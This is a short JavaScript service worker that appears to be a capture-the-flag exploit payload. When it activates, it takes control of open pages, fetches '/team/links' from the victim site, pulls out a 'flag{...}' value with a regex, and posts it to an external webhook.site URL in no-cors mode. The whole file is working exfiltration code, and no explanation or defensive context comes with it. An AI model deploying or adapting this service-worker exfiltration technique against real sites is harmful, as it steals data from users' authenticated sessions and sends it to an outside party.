const C = "https://webhook.site/4451235e-7729-4edc-9435-a587f7c83cd4";

self.addEventListener("install", (e) => self.skipWaiting());

self.addEventListener("activate", (e) => e.waitUntil((async () => {
  await self.clients.claim();
  const m = (await (await fetch("/team/links")).text()).match(/flag\{[^}]+\}/);
  if (m) await fetch(C, { method: "POST", mode: "no-cors", body: m[0] });
})()));
